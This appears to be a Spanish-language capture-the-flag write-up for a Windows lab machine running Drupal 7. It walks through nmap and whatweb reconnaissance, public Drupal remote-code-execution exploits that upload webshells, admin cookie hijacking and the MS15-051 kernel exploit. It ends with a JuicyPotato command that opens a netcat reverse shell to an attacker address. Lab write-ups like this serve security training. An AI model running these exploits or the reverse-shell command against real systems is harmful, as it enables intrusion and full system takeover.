-------
- Tags: #windows #juicypotato #drupal #sherlock #invokepowershell #kernel-exploitation 
-------
## Técnicas utilizadas
- Drupal Enumeration  
- Drupal 7.X Module Services - Remote Code Execution [SQL Injection]  
- Drupal Admin Cookie Hijacking  
- Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution  
- SA-CORE-2018-004 - 'Drupalgeddon3' Remote Code Execution  
- Sherlock Enumeration (Privilege Escalation)  
- MS15-051-KB3045171 - Kernel Exploitation [Way 1]  
- Abusing SeImpersonatePrivilege [Way 2]
## Procedimiento

![[Pasted image 20230711132355.png]]

#### Reconocimiento
SI lanzamos un **nmap** sobre la maquina victima, podemos ver los siguientes puertos expuestos:
```ruby
# nmap -sCV -p80,135,49154 10.10.10.9 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 20:26 MST
Nmap scan report for 10.10.10.9
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.09 seconds
```

Un escaneo sobre las tecnologías web con **whatweb** nos muestra esto:
```ruby
# whatweb 10.10.10.9
http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
```

--------
#### Drupal Enumeration  
Al visitar la pagina de primeras podemos observar que se trata de un gestor de contenido llamado **drupal**, segun **google**:

	Drupal es un sistema de gestión de contenidos o CMS libre, ​ modular, multipropósito y muy configurable que permite publicar artículos, imágenes, archivos y que también ofrece la posibilidad de otros servicios añadidos como foros, encuestas, votaciones, blogs, administración de usuarios y permisos.

Si buscamos por google por credenciales por defecto vemos `admin:admin` pero no funciona. **nmap** nos descubrio un **CHANGELOG.txt** anteriormente, si visitamos la ruta del archivo visualizamos la versión que esta actuamente en uso y podemos darnos alguna idea de vectores de ataque:
![[Pasted image 20230712202941.png]]

-------------
#### Drupal 7.X Module Services - Remote Code Execution [SQL Injection] 
Si buscamos con searchsploit por exploits para la versión que se esta usando actualmente, vemos demasiados:
![[Pasted image 20230712203251.png]]

Vamos a trarnos al directorio actual de trabajo la primera opcion que nos indica un **Remote Code Execution**. Hacemos algunas modificaciones al script ( cambiamos la url y el rest_point ), podemos cambiar el nombre del archivo que se subira y tambien el contenido que este tendra:
![[Pasted image 20230712203317.png]]

Lo ejecutamos y nos subira una **webshell** la cual podemos utilizar para ejecutar comandos en la maquina victima.

-------
#### Drupal Admin Cookie Hijacking
El exploit que ejecutamos anteriormente también nos crea un archivo de nombre **sessions.json** que contiene las **cookies** correspondientes a las del usuario administrador:
![[Pasted image 20230712203712.png]]

Si suplantamos las **cookies** en el navegador y recargarmos podemos observar que estamos como un usuario con privilegios maximos.

----------
#### Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution  
Dejando el lado el anterior exploit, también tenemos a nuestra disposición un exploit escrito en **ruby**
![[Pasted image 20230713123147.png]]

Este exploit hace lo mismo que el anterior, basicamente sube una **webshell** la cual nos permite ejecutar comandos.

-------
#### SA-CORE-2018-004 - 'Drupalgeddon3' Remote Code Execution  
Por otro lado, tenemos otro exploit de la misma indole escrito en **python3** y es del repositorio de [oways](https://github.com/oways). Es otra herramienta de boton gordo que con simplemente ejecutarlo y pasarle los argumentos correspondientes nos sube una **webshell** con la cual podemos ejecutar comandos.

--------
#### Sherlock Enumeration (Privilege Escalation) 
Descargarmos el repositorio del [nishang](https://github.com/samratashok/nishang) para entablarnos una reverse shell con **Power Shell**. Una vez dentro, podemos tirar algunas herramientas para inspeccinar algunas de las maneras para escalar privlegios, anteriormente habiamos usado **Winpeas** ( en algunas maquinas como la [[Most Important - Control|Control]] ) y también **powerUp.ps1** ( en la mauqina [[Most Important - Querier|Querier]] ) pero esta vez usaremos **Sherlock.ps1** del repositorio de [rasta-mouse](https://github.com/rasta-mouse). Lanzamos la funcion que analiza todas las vulnerabilidades y encontramos lo siguiente:
```
Image Vuln List Sherlock.ps1
```

--------------
#### MS15-051-KB3045171 - Kernel Exploitation [Way 1]  
Vemos que es vulnerable en **MS15-051** si buscamos en google por algun exploit, nos aparece un [binario](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/README.md) compilado para explotar esta vulnerabilidad. El uso del binario seria el siguiente:
```
c:\> MS15-051.exe whoami
```

Ahora podemos simplemente subir el **netcat** a la maquina y enviarnos una reverse shell a nuestra maquina.

------------
#### Abusing SeImpersonatePrivilege [Way 2]
Podemos tirar tambien de **JuicyPotato.exe** del repositorio de [ohpe](https://github.com/ohpe). Lo subimos a la maquina y ejecutamos:
```
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd 10.10.10.10 443'"
```